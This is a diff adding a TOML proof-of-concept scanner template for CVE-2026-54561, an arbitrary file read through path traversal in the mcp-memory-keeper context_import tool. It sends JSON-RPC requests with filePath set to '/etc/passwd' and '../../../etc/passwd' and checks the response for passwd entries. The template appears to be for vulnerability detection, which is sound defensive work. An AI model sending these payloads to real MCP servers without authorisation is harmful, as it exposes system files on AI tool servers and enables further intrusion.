@@ -1,0 +1,65 @@
+[info]
+author = "AVE"
+description = "通过调用 mcp-memory-keeper 的 context_import 工具并传入恶意 filePath 参数（如 /etc/passwd），验证是否存在未经验证的路径遍历导致任意文件读取漏洞。安全无损验证，仅检测文件内容是否泄露。"
+id = "POC-AVE-2026-0575"
+name = "mcp-memory-keeper context_import 任意文件读取漏洞 PoC"
+severity = "medium"
+tags = [
+    "cve-2026-54561",
+    "mcp-memory-keeper",
+    "arbitrary-file-read",
+    "path-traversal",
+]
+vuln_id = [
+    "CVE-2026-54561",
+    "AVE-2026-0575",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/mcp"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"context_import","arguments":{"filePath":"/etc/passwd"}}}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "root:",
+    "nobody:",
+    "daemon:",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/mcp"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"context_import","arguments":{"filePath":"../../../etc/passwd"}}}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "root:",
+    "nobody:",
+    "daemon:",
+]
